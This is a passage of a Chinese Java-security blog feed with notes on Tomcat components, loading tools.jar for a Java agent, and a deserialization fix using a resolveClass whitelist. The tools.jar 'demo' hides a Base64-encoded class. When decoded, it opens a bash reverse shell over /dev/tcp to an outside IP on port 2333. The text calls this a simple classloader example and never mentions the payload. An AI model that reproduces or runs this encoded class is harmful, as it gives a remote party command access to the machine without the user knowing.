        <content type="html"><![CDATA[<h1 id="深入学习tomcat"><a href="#深入学习tomcat" class="headerlink" title="深入学习tomcat"></a>深入学习tomcat</h1><h2 id="tomcat核心组件"><a href="#tomcat核心组件" class="headerlink" title="tomcat核心组件"></a>tomcat核心组件</h2><p><img src="/2022/11/10/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0tomcat/image-20220204195334994.png" alt="image-20220204195334994"></p><h2 id="核心组件的协助过程"><a href="#核心组件的协助过程" class="headerlink" title="核心组件的协助过程"></a>核心组件的协助过程</h2><p><img src="/2022/11/10/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0tomcat/image-20220204195638435.png" alt="image-20220204195638435"></p><h2 id="conf-server-xml"><a href="#conf-server-xml" class="headerlink" title="conf/server.xml"></a>conf/server.xml</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Server</span> <span class="attr">port</span>=<span class="string">&quot;8005&quot;</span> <span class="attr">shutdown</span>=<span class="string">&quot;SHUTDOWN&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Service</span> <span class="attr">name</span>=<span class="string">&quot;Catalina&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    可以修改Catalina名字--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">&quot;8080&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;HTTP/1.1&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">connectionTimeout</span>=<span class="string">&quot;20000&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">redirectPort</span>=<span class="string">&quot;8443&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--   连接器可以添加多个连接器就是端口和协议 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Engine</span> <span class="attr">name</span>=<span class="string">&quot;Catalina&quot;</span> <span class="attr">defaultHost</span>=<span class="string">&quot;localhost&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--      站点也可以添加多个 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Host</span> <span class="attr">name</span>=<span class="string">&quot;localhost&quot;</span>  <span class="attr">appBase</span>=<span class="string">&quot;webapps&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">unpackWARs</span>=<span class="string">&quot;true&quot;</span> <span class="attr">autoDeploy</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--修改默认的ROOT访问--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Context</span> <span class="attr">path</span>=<span class="string">&quot;/demo&quot;</span> <span class="attr">docBase</span>=<span class="string">&quot;D://demo&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Context</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Host</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Engine</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Service</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Server</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="tomcat请求流程"><a href="#tomcat请求流程" class="headerlink" title="tomcat请求流程"></a>tomcat请求流程</h2><p><img src="/2022/11/10/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0tomcat/image-20220204210315090.png" alt="image-20220204210315090"></p><h3 id="Pipeline结构"><a href="#Pipeline结构" class="headerlink" title="Pipeline结构"></a>Pipeline结构</h3><p><img src="/2022/11/10/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0tomcat/image-20220204210545634.png" alt="image-20220204210545634"></p><p>每次在配置中添加value是在默认的pipeline的前面。</p><p>也就是tomcat的每一个组件之间的相互调用是通过pipeline去实现的</p>]]></content>
      
      
      <categories>
          
          <category> 学习tomcat </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>解决agent中tools加载的问题</title>
      <link href="/2022/11/10/%E8%A7%A3%E5%86%B3agent%E4%B8%ADtools%E5%8A%A0%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2022/11/10/%E8%A7%A3%E5%86%B3agent%E4%B8%ADtools%E5%8A%A0%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="解决agent中tools加载的问题"><a href="#解决agent中tools加载的问题" class="headerlink" title="解决agent中tools加载的问题"></a>解决agent中tools加载的问题</h1><p>为什么有这个文章？因为我们在利用agent中的运行中attach pid需要利用到tools.jar的类不过默认java是不加载tools.jar类的所以我们需要解决它</p><p>解决方法是学大师傅们的方法的。</p><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>URLClassLoader去加载tools.jar路径并且将需要的类添加到map中，然后通过反射去实现。</p><p>代码：<a href="https://gist.github.com/Firebasky/c1efd9dc7eb964a77cb788c170a8598f">https://gist.github.com/Firebasky/c1efd9dc7eb964a77cb788c170a8598f</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.io.<span class="type">File</span> <span class="variable">toolsPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.File(System.getProperty(<span class="string">&quot;java.home&quot;</span>).replace(<span class="string">&quot;jre&quot;</span>, <span class="string">&quot;lib&quot;</span>) + java.io.File.separator + <span class="string">&quot;tools.jar&quot;</span>);</span><br><span class="line">java.net.<span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> toolsPath.toURI().toURL();</span><br><span class="line"><span class="comment">//URL url1 = new URL(&quot;file:C:\\Program Files\\java\\jdk1.8.0_201\\lib\\tools.jar&quot;);</span></span><br><span class="line"><span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[] &#123; url &#125;, Thread.currentThread().getContextClassLoader());</span><br></pre></td></tr></table></figure><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>自定义加载器</p><p><a href="https://xz.aliyun.com/t/10075#toc-4">https://xz.aliyun.com/t/10075#toc-4</a></p><blockquote><p>自定义的classLoader。但是我们都知道classLoader在loadClass的时候采用双亲委托机制，也就是如果系统中已经存在一个类，即使我们用自定义的classLoader去loadClass，也会返回系统内置的那个类。但是如果我们绕过loadClass，直接去defineClass即可从我们指定的字节码数组里创建类，而且类名我们可以任意自定义，重写java.lang.String都没问题:) 然后再用defineClass返回的Class去实例化。</p></blockquote><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sun.tools.attach;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VirtualMachine</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String cmd)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,cmd&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (IOException ee)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.demo2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Myloader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> <span class="comment">//继承ClassLoader</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">get</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;<span class="comment">//直接使用defineClass返回class对象</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String classStr=<span class="string">&quot;yv66vgAAADkALgoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwcADgEAEGphdmEvbGFuZy9TdHJpbmcIABABAAkvYmluL2Jhc2gIABIBAAItYwgAFAEAVmV4ZWMgNTw+L2Rldi90Y3AvMS4xMTYuMTM2LjEyMC8yMzMzO2NhdCA8JjUgfCB3aGlsZSByZWFkIGxpbmU7IGRvICRsaW5lIDI+JjUgPiY1OyBkb25lCgAIABYMABcAGAEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7BwAaAQATamF2YS9pby9JT0V4Y2VwdGlvbggAHAEAA2NtZAgAHgEAAi9jBwAgAQAtY29tL2ZpcmViYXNreS9zdW4vdG9vbHMvYXR0YWNoL1ZpcnR1YWxNYWNoaW5lAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAC9MY29tL2ZpcmViYXNreS9zdW4vdG9vbHMvYXR0YWNoL1ZpcnR1YWxNYWNoaW5lOwEAB2V4ZWN1dGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBABNWaXJ0dWFsTWFjaGluZS5qYXZhACEAHwACAAAAAAACAAEABQAGAAEAIQAAAC8AAQABAAAABSq3AAGxAAAAAgAiAAAABgABAAAABQAjAAAADAABAAAABQAkACUAAAAJACYAJwABACEAAAC3AAUAAwAAADy4AAcGvQANWQMSD1NZBBIRU1kFEhNTtgAVV6cAIUy4AAcGvQANWQMSG1NZBBIdU1kFKlO2ABVXpwAETbEAAgAAABoAHQAZAB4ANwA6ABkAAwAiAAAAHgAHAAAACAAaAA4AHQAJAB4ACwA3AA0AOgAMADsADwAjAAAAFgACAB4AHQAoACkAAQAAADwAHAAqAAAAKwAAABkAA10HABn/ABwAAgcADQcAGQABBwAZ+gAAAAEALAAAAAIALQ==&quot;</span>;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myloader</span>().get(Base64.getDecoder().decode(classStr));</span><br><span class="line">            <span class="keyword">for</span> (Method m:result.getDeclaredMethods())</span><br><span class="line">            &#123;</span><br><span class="line">                System.out.println(m.getName());</span><br><span class="line">                <span class="keyword">if</span> (m.getName().equals(<span class="string">&quot;execute&quot;</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    m.invoke(result,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不得不佩服大师傅啊！！！</p>]]></content>
      
      
      <categories>
          
          <category> obsidian hexo </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>H4ckbird 祝你有美好的一天！</title>
      <link href="/2022/11/09/hello-world/"/>
      <url>/2022/11/09/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Test-My’s-Blog"><a href="#Test-My’s-Blog" class="headerlink" title="Test My’s Blog"></a>Test My’s Blog</h2><ul><li>如果能够看到这篇文章说明成功了</li><li>这里是显示的内容</li><li>我发现自己就是蠢货</li></ul><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate   hexo g</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy  hexo d</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PythonSec</title>
      <link href="/2022/10/21/PythonSec/"/>
      <url>/2022/10/21/PythonSec/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b51dc264cb37bc53e3ddebaf4ed0bdac601233f5e825831707a04a82f9db0b5d">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f79ae02593b7b02f0446f48d67e6ee7a2af93499f2d4756e3e8753512288d6a09ad4aaaa49fb1571e89907301a31bf7e180577b186bdef76f2eed66b0259257aa562353a80b8aa575686cc7fafd3d86664753c8431cebf2ac21220f87d04ed07b6eff5ac1a59a1153215370bfd9f54af7ba350220d322b880695f795b476829abd42d1a5d35cf49542220580c2d502a0c4309f87228ee6fccf64fccc8da998c43f6a6b021d3eabda6667a896f67d63f658027f0da2014c84e09be4f2689b02ea5c28280a2a79bb5cdcf8f819823ee8d11894f63b5f2033c529d9c855a698874a0a891e434887ec2a953eff04cc4d0318c6b91b1b693c65a0e2b0fb2f1845f9e237a12088415ac8ce86f12f907a05eb7893952e246de00e49d9f8166b67d003b6e1362e4e17e159becfd2c0efa8e56ec5a3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Python security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java fix序列化漏洞</title>
      <link href="/2022/09/10/java-fix%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/09/10/java-fix%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="java-fix序列化漏洞"><a href="#java-fix序列化漏洞" class="headerlink" title="java fix序列化漏洞"></a>java fix序列化漏洞</h1><p>重点看了看java序列化的fix的操作，于是就简单的记录一下。</p><p><a href="https://github.com/Cryin/Paper/blob/master/%E6%B5%85%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88.md">github上有一篇文章写的比较全</a>这里自己只是实现其中的一个方法，而该方法也是<a href="https://github.com/ikkisoft/SerialKiller">SerialKiller</a>项目的底层原理。</p><h4 id="hook-ObjectInputStream类的resolveClass方法"><a href="#hook-ObjectInputStream类的resolveClass方法" class="headerlink" title="hook ObjectInputStream类的resolveClass方法"></a>hook ObjectInputStream类的resolveClass方法</h4><blockquote><p>需要继承Java.io.ObjectInputStream实现一个子类，在子类中重写resolveClass方法，以实现在其中通过判断类名来过滤危险类。然后在JavaSerializer类中使用这个子类来读取序列化数据，从而修复漏洞。</p></blockquote><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> xlh.fix.HookResolveClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HookObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HookObjectInputStream</span><span class="params">(InputStream inputStream)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 只允许反序列化xlh.serialVersionUID.Address.class</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException,</span><br><span class="line">            ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!desc.getName().equals(xlh.serialVersionUID.Address.class.getName())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                    <span class="string">&quot;Unauthorized deserialization attempt&quot;</span>,</span><br><span class="line">                    desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> xlh.fix.HookResolveClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> xlh.serialVersionUID.Address;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;d:\\address.ser&quot;</span>);<span class="comment">//这样的话cc6.ser就不能使用了。</span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HookObjectInputStream</span>(fin);</span><br><span class="line">            <span class="type">Address</span> <span class="variable">address</span> <span class="operator">=</span> (Address) ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">            System.out.println(address);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception ex)&#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他利用fix思路不过多介绍。</p><p>突然想到了国赛java题的修复方案，是通过修改关键类中的serialVersionUID，<a href="https://www.cnblogs.com/xuxinstyle/p/11394358.html">serialVersionUID</a>可以理解为java序列化的标识。只有满足序列化后的serialVersionUID值和序列化前的值一样才可以成功反序列化。不然会报错<strong>InvalidClassException</strong></p><p><a href="http://www.code2sec.com/ji-yi-ci-javafan-xu-lie-hua-lou-dong-de-fa-xian-he-xiu-fu.html">一篇好文章</a></p><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>介绍了fix，然后在介绍一下漏洞挖掘的思路，只是自己的思路。。。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">一个类被加载到jvm中，是还没有进行初始化的，通常情况下可以通过<span class="keyword">new</span>、newInstance、Class.forName等方法来初始化。同时在初始化的过程中会调用类的静态方法/属性或者构造函数。所以经常有见到类写成如下形式：</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello Test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">这种时候通过Class.forName再初始化类的时候，jvm会自动调用其中的静态代码块，并输出。</span><br></pre></td></tr></table></figure><p>所以如果我们能控制<strong>Class.forName</strong>的值，并且我们重写一个恶意的静态方法就能够成功利用（这里和p师傅文章中的java安全慢谈一样）。</p><p>对于new、newInstance进行初始化类的时候会调用其无参的构造函数。至于利用思路，师傅们可以自己去思考。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">instance</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;static&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    instance()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">instance</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">instance</span>();</span><br><span class="line"><span class="comment">//        instance.class.newInstance();</span></span><br><span class="line"><span class="comment">//        Class.forName(&quot;instance&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaSec</title>
      <link href="/2022/06/21/JavaSec/"/>
      <url>/2022/06/21/JavaSec/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="323fef4b6167a2193f2a9c41da67b3ec589089abd9929d0dc764a48bfb82c234">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f7dc240770bb65efcf40282cb335336366056f1aecead61d7dad29a73b32810672f574192d3d13cb2a8444a6527d1660f31db106d643e00f8ea7e47e3d934aa09a7f5d1d6eee1f7c294059a33a7ef75553329d2d3113ca6154d07cc43b7d66387bebac79eaa533c40fffd25c3c8c1a3db89e809aae83b4b3ca713bf12c5fe6f865d3f0e104ad6de3decc6743f33803326e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Java security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-maven打包学习</title>
      <link href="/2022/05/10/java-maven%E6%89%93%E5%8C%85%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/05/10/java-maven%E6%89%93%E5%8C%85%E5%AD%A6%E4%B9%A0/</url>
      
